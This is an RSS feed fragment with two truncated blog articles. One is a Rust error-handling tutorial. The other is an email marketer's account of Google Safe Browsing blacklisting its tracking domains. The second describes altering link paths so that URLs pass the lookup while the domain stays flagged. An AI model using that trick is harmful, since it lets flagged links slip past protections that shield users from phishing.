<nav id="TableOfContents">
  <ul>
    <li><a href="#intro">Intro</a></li>
    <li><a href="#counting-words">Counting words</a>
      <ul>
        <li><a href="#missing-context">Missing context</a></li>
      </ul>
    </li>
    <li><a href="#libraries-versus-applications">Libraries versus applications</a>
      <ul>
        <li><a href="#api-boundaries">API boundaries</a></li>
        <li><a href="#the-library-error-type">The library error type</a></li>
        <li><a href="#returning-library-errors">Returning library errors</a></li>
        <li><a href="#application-errors">Application errors</a></li>
      </ul>
    </li>
    <li><a href="#backtraces">Backtraces</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#feedback-and-conversations">Feedback and conversations</a></li>
  </ul>
</nav>

<h2 id="intro">Intro</h2>
<p>While the book goes through the basics of error handling, including use of the <a href="https://doc.rust-lang.org/std/result/">std::Result</a> type and error propagation with the <a href="https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html#a-shortcut-for-propagating-errors-the--operator"><code>?</code></a> operator, it largely glosses over the different patterns for using these tools in real-world applications or the trade-offs involved with different approaches. <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>When I began looking into best practices, I came across quite a bit of outdated advice to use the <a href="https://github.com/rust-lang-nursery/failure/"><em>failure</em> crate</a>.
<em>Failure</em> had a semi-official feel to it as a result of being in the <code>rust-lang-nursery</code> namespace, but <a href="https://github.com/rust-lang-nursery/failure/pull/347">it has recently been deprecated</a>.</p>
<p>There have been a number of improvements to the <a href="https://doc.rust-lang.org/std/error/trait.Error.html">std::error::Error</a> trait in the past two years. <sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>
These have made <em>failure</em> less needed in general and have sparked a number of more modern libraries taking advantage of these improvements to offer better ergonomics.</p>
<p>After reading through quite a lot of historical context and evaluating a number of libraries, I’ve now settled on a (largely library-agnostic) pattern for structuring errors, which I implement using the <a href="https://crates.io/crates/anyhow">anyhow</a> and <a href="https://crates.io/crates/thiserror">thiserror</a> crates. <sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<p>The rest of this article will:</p>
<ol>
<li>Introduce a relatively trivial word-counting application to explore and explain the problem space.</li>
<li>Explain why applications and libraries should use different error-handling patterns.</li>
<li>Demonstrate how to apply these patterns using <code>anyhow</code> and <code>thiserror</code>.</li>
</ol>
<h2 id="counting-words">Counting words</h2>
<p>Let’s introduce some example code for use throughout the rest of this article.
We’ll build a program to count the number of words in a text file, much like <a href="http://man7.org/linux/man-pages/man1/wc.1.html">wc -w</a> would do.</p>
<p>A naive implementation with basic error handling using <a href="https://doc.rust-lang.org/std/result/">std::Result</a> might look like this:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span></code></pre></td>
<td>
<pre><code data-lang="rust"><span>use</span><span> </span><span>std</span>::<span>env</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>error</span>::<span>Error</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>fs</span>::<span>File</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>io</span>::<span>prelude</span>::<span>*</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>io</span>::<span>BufReader</span><span>;</span><span>
</span><span>
</span><span></span><span>/// Count the number of words in the given input.
</span><span>///
</span><span>/// Any potential errors, such as being unable to read from the input will be propagated
</span><span>/// upwards as-is due to the use of `line?` just before `split_whitespace()`.
</span><span></span><span>fn</span> <span>count_words</span><span>&lt;</span><span>R</span>: <span>Read</span><span>&gt;</span><span>(</span><span>input</span>: <span>&amp;</span><span>mut</span><span> </span><span>R</span><span>)</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>u32</span><span>,</span><span> </span><span>Box</span><span>&lt;</span><span>dyn</span><span> </span><span>Error</span><span>&gt;&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>reader</span><span> </span><span>=</span><span> </span><span>BufReader</span>::<span>new</span><span>(</span><span>input</span><span>);</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>wordcount</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span><span>
</span><span>    </span><span>for</span><span> </span><span>line</span><span> </span><span>in</span><span> </span><span>reader</span><span>.</span><span>lines</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>for</span><span> </span><span>_word</span><span> </span><span>in</span><span> </span><span>line</span><span>?</span><span>.</span><span>split_whitespace</span><span>()</span><span> </span><span>{</span><span>
</span><span>            </span><span>wordcount</span><span> </span><span>+=</span><span> </span><span>1</span><span>;</span><span>
</span><span>        </span><span>}</span><span>
</span><span>    </span><span>}</span><span>
</span><span>    </span><span>Ok</span><span>(</span><span>wordcount</span><span>)</span><span>
</span><span></span><span>}</span><span>
</span><span>
</span><span></span><span>fn</span> <span>main</span><span>()</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>(),</span><span> </span><span>Box</span><span>&lt;</span><span>dyn</span><span> </span><span>Error</span><span>&gt;&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>for</span><span> </span><span>filename</span><span> </span><span>in</span><span> </span><span>env</span>::<span>args</span><span>().</span><span>skip</span><span>(</span><span>1</span><span>).</span><span>collect</span>::<span>&lt;</span><span>Vec</span><span>&lt;</span><span>String</span><span>&gt;&gt;</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>let</span><span> </span><span>mut</span><span> </span><span>reader</span><span> </span><span>=</span><span> </span><span>File</span>::<span>open</span><span>(</span><span>&amp;</span><span>filename</span><span>)</span><span>?</span><span>;</span><span>
</span><span>
</span><span>        </span><span>let</span><span> </span><span>wordcount</span><span> </span><span>=</span><span> </span><span>count_words</span><span>(</span><span>&amp;</span><span>mut</span><span> </span><span>reader</span><span>)</span><span>?</span><span>;</span><span>
</span><span>        </span><span>println</span><span>!</span><span>(</span><span>"{} {}"</span><span>,</span><span> </span><span>wordcount</span><span>,</span><span> </span><span>filename</span><span>);</span><span>
</span><span>    </span><span>}</span><span>
</span><span>
</span><span>    </span><span>Ok</span><span>(())</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>Let’s generate an input file for our new word counter and try to run it:</p>
<pre><code>$ fortune &gt; words.txt
$ cargo run --quiet -- words.txt
50 words.txt
</code></pre><p>If you don’t have a <code>words.txt</code> however, you’ll encounter the following error:</p>
<pre><code>$ cargo run --quiet -- words.txt
Error: Os { code: 2, kind: NotFound, message: "No such file or directory" }
</code></pre><p>This error is the result of <code>File::open()</code> returning an error in <code>main()</code>.</p>
<p>To make the example complete, let’s also <a href="https://github.com/zoni/rust-wordcount/blob/36f4545f2b994f054a17ac31df07e2f762c6ac24/src/wordcounter.rs#L124-L125">simulate an error</a> in the <code>read()</code> call happening under the hood inside <code>count_words()</code> <sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> so we can see what that looks like:</p>
<pre><code>$ cargo run --quiet -- words.txt
Error: Custom { kind: BrokenPipe, error: "read: broken pipe" }
</code></pre><h3 id="missing-context">Missing context</h3>
<p>So what’s wrong with the above error?
While the underlying error cause (<em>“broken pipe”</em>) is made clear, we’re missing a lot of context.
We can’t tell which file could not be opened and there is no information about the sequence of events leading up to this error.</p>
<p>When you think about it, there’s a chain of errors here:</p>
<ul>
<li><code>main()</code> returns an error because <code>count_words()</code> returns an error.</li>
<li><code>count_words()</code> returns an error because we run into an error iterating over <code>reader.lines()</code> (lines 14-15).</li>
<li>Iterating over <code>reader.lines()</code> errors because we injected an implementation of <code>std::io::Read</code> that fails on the first call to <code>read()</code>.</li>
</ul>
<p>However, we don’t really see this reflected in the error messages above.</p>
<p>In this example the file name is an input argument for the program itself.
This makes it easy to correlate the error to the file it was trying to open.</p>
<p>Now imagine an error happening 5 calls deep inside a library within a much larger piece of software.
Without any information on the chain of events in such a case, it quickly gets very difficult to understand what might be causing the error.</p>
<h2 id="libraries-versus-applications">Libraries versus applications</h2>
<p>Earlier on I mentioned <strong>two</strong> different libraries, <a href="https://crates.io/crates/anyhow">anyhow</a> and <a href="https://crates.io/crates/thiserror">thiserror</a> (though both are by the same author, <a href="https://rustaceans.org/search/dtolnay">dtolnay</a>).
You might be wondering why we need two separate libraries to do something as basic as dealing with errors.</p>
<p>It took me a moment to appreciate this distinction, but there’s value in approaching error handling differently between libraries and applications as they tend to have different concerns:</p>
<ul>
<li>Libraries should focus on <em>producing</em> meaningful, structured error types/variants.
This allows applications to easily differentiate various error cases.</li>
<li>Applications mainly <em>consume</em> errors.</li>
<li>Libraries may want to cast errors from one type to another.
An IO error should likely be wrapped by a high-level error type provided by the library.
<ul>
<li>Otherwise an IO error in library <code>foo</code> cannot be distinguished from a similar IO error in library <code>bar</code>.</li>
<li>Not doing so also requires the consumer to know library internals.
For example, is it just IO errors that might be returned? What about HTTP errors that might originate from an HTTP client internal to the library?</li>
</ul>
</li>
<li>Libraries must be careful when changing errors or creating new errors, as these can easily introduce breaking changes for consumers.
They may produce new errors internally, but these are unlikely to require special structure and can be more easily changed at will.</li>
<li>Where libraries return errors, applications decide if and how those errors are formatted and displayed to users.</li>
<li>Applications may also want to parse and inspect errors, for example to forward them to exception tracking services or to retry operations when doing so is deemed to be safe.</li>
</ul>
<p>Additionally, and I think this is quite important, <strong>libraries should always use <a href="https://doc.rust-lang.org/std/result/">std::Result</a> together with an error type implementing <a href="https://doc.rust-lang.org/std/error/trait.Error.html">std::error::Error</a> in their public APIs</strong>.
Custom result types like <a href="https://docs.rs/failure/0.1.8/failure/trait.Fail.html">failure::Fail</a> may not compose well with other parts of your user’s code and force them to learn yet another library.</p>
<h3 id="api-boundaries">API boundaries</h3>
<p>Coming back to our word counting example, imagine we want to make <code>count_words</code> available as a public library.
You wouldn’t normally do this for such a small and simple piece of code, but there can be value in making functionality available through public crates within larger projects.</p>
<p>As a demonstration, we can define boundaries in our word counter to separate this code into a library and an application part.</p>
<p>We’ll extract <code>count_words</code> into a <em>library crate</em> named <em>wordcounter</em>.
I’ll highlight relevant parts below, but if you want to skip ahead, you can find the complete <a href="https://github.com/zoni/rust-wordcount/blob/master/src/wordcounter.rs">src/wordcounter.rs</a> on GitHub.</p>
<p>Everything outside of <code>count_words</code> is our application code.
This is going to live in a <em>binary crate</em> which we’ll call <em>rwc</em> (for <em>Rust Word Count</em> — very original, I know).
The relevant files for this are <a href="https://github.com/zoni/rust-wordcount/blob/master/src/main.rs">src/main.rs</a> and <a href="https://github.com/zoni/rust-wordcount/blob/master/src/lib.rs">src/lib.rs</a>.</p>
<h3 id="the-library-error-type">The library error type</h3>
<p>For our <em>wordcounter</em> library, we’ll define a top-level error type called <a href="https://github.com/zoni/rust-wordcount/blob/36db340c9beaf14032c93f63afcb413f99ec3291/src/wordcounter.rs#L23-L38">WordCountError</a>.
This enum has error variants for every possible error that our library might encounter.</p>
<p>This is where <a href="https://crates.io/crates/thiserror">thiserror</a> comes into play.
While we could implement this by hand, <em>thiserror</em> allows us to avoid writing lots of boilerplate code:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span></code></pre></td>
<td>
<pre><code data-lang="rust"><span>use</span><span> </span><span>thiserror</span>::<span>Error</span><span>;</span><span>
</span><span>
</span><span></span><span>/// WordCountError enumerates all possible errors returned by this library.
</span><span></span><span>#[derive(Error, Debug)]</span><span>
</span><span></span><span>pub</span><span> </span><span>enum</span> <span>WordCountError</span><span> </span><span>{</span><span>
</span><span>    </span><span>/// Represents an empty source. For example, an empty text file being given
</span><span></span><span>    </span><span>/// as input to `count_words()`.
</span><span></span><span>    </span><span>#[error(</span><span>"Source contains no data"</span><span>)]</span><span>
</span><span>    </span><span>EmptySource</span><span>,</span><span>
</span><span>
</span><span>    </span><span>/// Represents a failure to read from input.
</span><span></span><span>    </span><span>#[error(</span><span>"Read error"</span><span>)]</span><span>
</span><span>    </span><span>ReadError</span><span> </span><span>{</span><span> </span><span>source</span>: <span>std</span>::<span>io</span>::<span>Error</span><span> </span><span>},</span><span>
</span><span>
</span><span>    </span><span>/// Represents all other cases of `std::io::Error`.
</span><span></span><span>    </span><span>#[error(transparent)]</span><span>
</span><span>    </span><span>IOError</span><span>(</span><span>#[from]</span><span> </span><span>std</span>::<span>io</span>::<span>Error</span><span>),</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>(Quoting the official documentation: <em>“Thiserror deliberately does not appear in your public API. You get the same thing as if you had written an implementation of <code>std::error::Error</code> by hand, and switching from handwritten impls to thiserror or vice versa is not a breaking change."</em>)</p>
<p>With this error type, we can now change the signature of <code>count_words</code> as follows:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>count_words</span><span>&lt;</span><span>R</span>: <span>Read</span><span>&gt;</span><span>(</span><span>input</span>: <span>&amp;</span><span>mut</span><span> </span><span>R</span><span>)</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>u32</span><span>,</span><span> </span><span>WordCountError</span><span>&gt;</span><span> </span><span>{</span><span> </span><span>/* .. */</span><span> </span><span>}</span><span>
</span></code></pre></div><p>Remember previously, the signature looked like this:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>count_words</span><span>&lt;</span><span>R</span>: <span>Read</span><span>&gt;</span><span>(</span><span>input</span>: <span>&amp;</span><span>mut</span><span> </span><span>R</span><span>)</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>u32</span><span>,</span><span> </span><span>Box</span><span>&lt;</span><span>dyn</span><span> </span><span>Error</span><span>&gt;&gt;</span><span> </span><span>{</span><span> </span><span>/* .. */</span><span> </span><span>}</span><span>
</span></code></pre></div><p>Compared to the previous version, our new code is a lot more specific.
Users now get a lot more insight into the possible error cases that might be returned.
As an added benefit, we also no longer have to Box <code>Error</code> because the size of <code>WordCountError</code> can be determined at compile time.</p>
<h3 id="returning-library-errors">Returning library errors</h3>
<p>In <code>WordCountError</code> above we specify three possible types of error.</p>
<p><code>EmptySource</code> may be …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nick.groenen.me/posts/rust-error-handling/">https://nick.groenen.me/posts/rust-error-handling/</a></em></p>]]>
            </description>
            <link>https://nick.groenen.me/posts/rust-error-handling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25805340</guid>
            <pubDate>Sat, 16 Jan 2021 20:44:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google’s Safe Browsing program made my week hell]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25804505">thread link</a>) | @cft
<br/>
January 16, 2021 | https://www.gmass.co/blog/google-safe-browsing/ | <a href="https://web.archive.org/web/*/https://www.gmass.co/blog/google-safe-browsing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9020">
	<!-- <header class="entry-header"> -->
					<!-- <div class="entry-meta"> -->
							<!-- </div> -->
			<!-- </header> -->

	
	<div>
		<p>Google’s <a href="https://safebrowsing.google.com/">Safe Browsing</a> program protects a lot of people from <strong>phishing</strong>, <strong>malware</strong>, and other harmful sites. In fact, it’s so pervasive that it’s not just used by Chrome. Google has managed to get competing browsers,&nbsp;<strong>Safari and</strong>&nbsp;<strong>Firefox,</strong>&nbsp;to use it as well. The list of websites blacklisted though is all maintained by Google, giving Google&nbsp;a&nbsp;disproportionate amount of power over what sites are seen versus blocked.</p>
<p>I’ll explain what happened during our harrowing week in a moment; but first, let me share an <strong>update about Google’s Safe Browsing API</strong>:</p>
<ul>
<li>Effective September 11, 2019, the <strong><a href="https://developers.google.com/safe-browsing">Safe Browsing API</a></strong> is limited to non-commercial use only. It is a free service.</li>
<li>If you’re a <strong>non-commercial user</strong>, you can continue to use the Safe Browsing API, and you don’t need to take any action. Also, a<span data-preserver-spaces="true">cademic researchers and NGOs will continue to be eligible to use the Safe Browsing API at no cost.&nbsp;</span></li>
<li><strong>Commercial users</strong>, like GMass, are required to switch to the <strong><a href="https://cloud.google.com/web-risk/">Web Risk API</a></strong> by November 11, 2019. This version is a paid service, and if you’re a commercial user, as we are, then you’ll need to switch. Also, you’ll need to apply and be approved to use the API, so don’t wait.</li>
<li>Both APIs are directed at protecting users from malware and phishing, but the new Web Risk API is designed specifically for larger users.</li>
</ul>
<p>And now, back to our story …</p>
<h3>What happened?</h3>
<p>At the beginning of last week, my team&nbsp;suddenly had a deluge of complaints from <strong>users reporting that their links had stopped working</strong>, their <strong>sending limits had been reduced</strong>, and they’d <strong>received phishing notifications from Google</strong>. Ouch! Upon investigating, we found that the tracking domains they use in their email campaigns&nbsp;had ended up on the Google’s Safe Browsing blacklist, and when people clicked links in their campaigns, they ended up on this scary bright red Google warning page.</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Gmail-Dangerous-Warning-Link-Wordzen-Com-web.png" alt="" width="1685" height="613">There’s the rub. <em>Not only does Google list actual phishing sites, but any sites that re-direct to them as well.</em> That makes it so that any providing click-tracking services, including <strong>URL shorteners</strong> and <strong>email marketing service providers</strong>, have to be extra cautious.</p>
<p>In slogging through our logs we found that a Netflix phisher had managed to send 200 emails through GMass on Sunday, February 17. Here’s the email he sent. Notice that the URL behind the link is highlighted at the bottom. In this case, the URL https://www.gregsimages.com/cgi-bin led to the red screen of death, as did our click-tracked links that redirected to this URL.</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Safe-Browsing-Netflix-Email-web.png" alt="" width="1333" height="574"></p>
<h3>The effect of being listed goes beyond just the web</h3>
<p>What happens to your email campaigns when you send a URL that’s on this list? Gmail makes you&nbsp;feel like the devil reincarnate.</p>
<ol>
<li>Your Gmail account&nbsp;becomes <strong>severely limited</strong> and&nbsp;<strong>unable able to send any substantial volume</strong> of emails.</li>
<li>If you do manage to&nbsp;send an email with a blacklisted link,&nbsp;and that link is clicked, you’ll <strong>scare the&nbsp;bejesus out of them</strong> with&nbsp;the red screen of death.</li>
<li>Your <strong>past campaigns are affected</strong> too, if someone pulls up one of those old emails and clicks a link.</li>
<li>If people <strong>reply</strong> to you, the reply will still have the original email at the bottom, with the link that you sent, and Google <strong>will flag the <em>reply to you</em> as a potential scam</strong> too.<br>
<img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Gmail-Dangerous-Warning-web.png" alt="" width="2509" height="1618"></li>
</ol>
<p>Obviously not a good look for an email marketer.</p>
<h3>What was actually affected?</h3>
<p>In our case, when we got the notice that <strong>link.wordzen.com was listed</strong>, I wanted to <strong>isolate which link.wordzen.com URLs were affected</strong>.</p>
<p>Using the public <a href="https://transparencyreport.google.com/safe-browsing/search?hl=en">Safe Browsing lookup tool</a>, which is different from the private tool everyone has in their <strong>Search Console</strong>, I found that plugging in just link.wordzen.com gave this result, indicating that some URLs were affected and others weren’t:</p>
<figure id="attachment_4078" aria-describedby="caption-attachment-4078"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/03/Safe-Browsing-Lookup-Some-Unsafe-web.png" alt="" width="3168" height="1874"><figcaption id="caption-attachment-4078">Just “link.wordzen.com” indicates that SOME pages are unsafe.</figcaption></figure>
<p>But if I plugged in our original click tracking structure, link.wordzen.com/x/c, then the issue was clear that all /x/c links were blacklisted</p>
<figure id="attachment_4079" aria-describedby="caption-attachment-4079"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/03/Safe-Browsing-Lookup-Unsafe-web.png" alt="" width="3180" height="1798"><figcaption id="caption-attachment-4079">Using our old click-tracking link structure shows that all URL redirects using link.wordzen.com are unsafe.</figcaption></figure>
<p>Curious, though, I wondered what would happen if I changed the URL slightly, so I tried link.wordzen.com/x/d and found that those URLs came back clean</p>
<figure id="attachment_4082" aria-describedby="caption-attachment-4082"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/03/Link-Wordzen-Com-Safe-web-1.png" alt="" width="3180" height="1204"><figcaption id="caption-attachment-4082">Slightly altering the link structure makes the link safe again.</figcaption></figure>
<p>You’ll see below that this discovery led me to change the structure of a click-tracked link.</p>
<h3>Some&nbsp;nonsense associated with the Safe Browsing Program</h3>
<h5><span>1. Despite claims of transparency, it’s anything but.</span></h5>
<p>As soon as your domain has been listed, you will probably want to know the URL that caused the issue. Unfortunately for you, <strong>Google won’t tell you</strong>. In the <strong>Search Console</strong> you might see this:</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Google-Search-Console-Blacklisted-web-1.png" alt="" width="1240" height="942"></p>
<p>If you received an email notification about the blacklisting, that will have a portion of the URL.</p>
<figure id="attachment_4039" aria-describedby="caption-attachment-4039"><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Social-Engineering-Email-Notification-web-1.png" alt="" width="1132" height="1241"><figcaption id="caption-attachment-4039">The email notification you receive provides some clue as to the offending URL, while the notice in the Search Console gives you NO worthwhile info.</figcaption></figure>
<p>For my purposes, this did not help at all, because every click-tracked link in the history of GMass starts with /x/c. The important stuff is all <em>after</em> that part, and that’s the part that Google eliminates from its reports. <strong>How this qualifies as transparency is beyond me.</strong></p>
<p><em>So what do you do now?</em> You crawl through your logs and figure out what happened. In my case, I ran all sorts of analyses, starting with a time distribution analysis of all clicks in the last 72 hours, looking for anomalies. I also discovered my new best friend, a tool from Microsoft called <a href="https://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765">Log Parser Studio</a>, that lets me run SQL queries against my IIS log files, <em>without importing the log files</em> into a database. Slick! That’s how I concluded that the aforementioned Netflix phisher was the culprit.</p>
<h5><span>2. The Safe Browsing API has been broken since day one.</span></h5>
<p>I’m <a href="https://groups.google.com/forum/#!topic/google-safe-browsing-api/pdVIo3qXsGk">not the only one</a>&nbsp;who’s&nbsp;frustrated over&nbsp;the seemingly useless <a href="https://developers.google.com/safe-browsing/v4/">Safe Browsing API</a>.</p>
<p>Here’s a screenshot showing the listing of link.wordzen.com.</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Google-Search-Console-Blacklisted-web.png" alt="" width="1240" height="942"></p>
<p>Here’s a screenshot showing the API result:</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Safe-Browsing-API-Fail-web.png" alt="" width="2121" height="969"></p>
<p>So with a useless API, how does one monitor whether new URLs have been listed or old URLs have been marked safe? I used Upwork to quickly a hire a team of <strong>Virtual Assistants in the Philippines</strong> to <strong>manually enter all 1,400</strong> of our customers’ tracking domains into the web lookup tool and to do so <strong>every 12 hours until further notice</strong>.</p>
<p>In case you’re a C# programmer and want to try this yourself, here’s the code:</p>
<pre><span>            string</span><span> apikey = </span>"AIzaSyBnIDLCc*************z4twxdx28"<span>;</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;   </span><span>string</span> payload = <span>@"{</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""client"": {
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""clientId"":<span>&nbsp; &nbsp; &nbsp; </span>""gmass"",
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""clientVersion"": ""1.0.0""
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>},

<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatInfo"": {
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatTypes"":<span>&nbsp; &nbsp; &nbsp; </span>[""MALWARE"", ""SOCIAL_ENGINEERING"", ""UNWANTED_SOFTWARE"", ""POTENTIALLY_HARMFUL_APPLICATION""],
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""platformTypes"":<span>&nbsp; &nbsp; </span>[""WINDOWS""],
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatEntryTypes"": [""URL""],
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>""threatEntries"": [
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>{""url"": ""http://link.wordzen.com""}
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>]
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>}
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>}"<span>;</span>

<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>using</span> (<span>var</span> client = <span>new</span> <span>HttpClient</span>())
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>{
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>var</span> content = <span>new</span> <span>StringContent</span>(payload, <span>Encoding</span>.Default, <span>"application/json"</span>);
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>var</span> response = client.PostAsync(<span>$"https://safebrowsing.googleapis.com/v4/threatMatches:find?key=</span>{apikey}<span>"</span>, content).Result;
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span>string</span> resultContent = response.Content.ReadAsStringAsync().Result;
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>}</pre>
<p>There is also a <a href="https://developers.google.com/api-client-library/dotnet/apis/safebrowsing/v4">.NET client library for the Safe Browsing API</a>, but I chose not to use it because I wanted to be&nbsp;in control of the exact JSON payload request&nbsp;so that I knew that I wasn’t making a mistake.</p>
<h5><span>3. Reviews take a long time to process.</span></h5>
<p>Despite <a href="https://developers.google.com/web/fundamentals/security/hacked/request_review">Google’s claims</a><strong> that a phishing URL will be reviewed within 24 hours</strong> and a <strong>malware&nbsp;URL&nbsp;within 72 hours</strong>, I found it <strong>took more like 120 hours (5 days)</strong>. After a week of hell though, there’s no sweeter email one can receive than this, clearing your&nbsp;domain off the dreaded blacklist:</p>
<p><img loading="lazy" src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/02/Safe-Browsing-Review-Successful-web.png" alt="" width="943" height="786"></p>
<p>You can submit each URL for review, and in our case, we did it for hundreds of our customers too.</p>
<h3>How&nbsp;I worked around the blacklisting of 300 domains</h3>
<p>During the time our customers’ domains were listed, we couldn’t just sit idle&nbsp;waiting for Google, because customers needed to&nbsp;send their email campaigns out. We took a number of counter-measures and you can take these too, should you find yourself in this situation.</p>
<h5><span>1. Removed&nbsp;all affected customer tracking domains from their accounts</span></h5>
<p>The first step we took was to remove all the affected tracking domains from users’ accounts, causing them to fall back to our shared tracking domain, which for paying users, is a clean domain based on Amazon’s AWS domain. That eliminated the issue in future campaigns.</p>
<h5><span>2. Altered structure of click tracking link</span></h5>
<p>I felt a little shady making this change system-wide, but it turned out it worked, and saved me from an ever-growing mob of angry users. The old structure of a click-tracked link looked like:</p>
<pre>http://link.wordzen.com/x/c?c=2724793&amp;l=dedb940f-55dd-4c33-a3cc-f5d8028183ca&amp;r=ed06197e-cf9e-4fea-a371-d5f455968519</pre>
<p>By&nbsp;plugging various combinations of URL structures into the <a href="https://transparencyreport.google.com/safe-browsing/search?hl=en">lookup tool</a>, we noticed that the link above was flagged as dangerous, but if we made a simple change, changing the /c to /d, then the URL came back as safe, so we changed the structure of links to use /d instead of /c, like this:</p>
<pre>http://link.wordzen.com/x/d?c=2724793&amp;l=dedb940f-55dd-4c33-a3cc-f5d8028183ca&amp;r=ed06197e-cf9e-4fea-a371-d5f455968519</pre>
<p>Of course for backward compatibility, we made sure that the /c URLs still worked also.</p>
<p>Making this change allowed users to keep using their custom tracking domain, even if their tracking domain was still listed in the Safe Browsing system as a potential phishing domain.</p>
<h5><span>3. Locked down how click-tracking works to prevent future issues</span></h5>
<p>I should have implemented this from day one, but I could have never expected an evildoer to exploit this loophole. You may know that to set up a custom tracking domain, you create a sub-domain off your existing domain and set its CNAME to x.gmtrack.net. So in my …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.gmass.co/blog/google-safe-browsing/">https://www.gmass.co/blog/google-safe-browsing/</a></em></p>]]>
            </description>
            <link>https://www.gmass.co/blog/google-safe-browsing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25804505</guid>
            <pubDate>Sat, 16 Jan 2021 19:06:35 GMT</pubDate>
        </item>
        <item>
            <title>
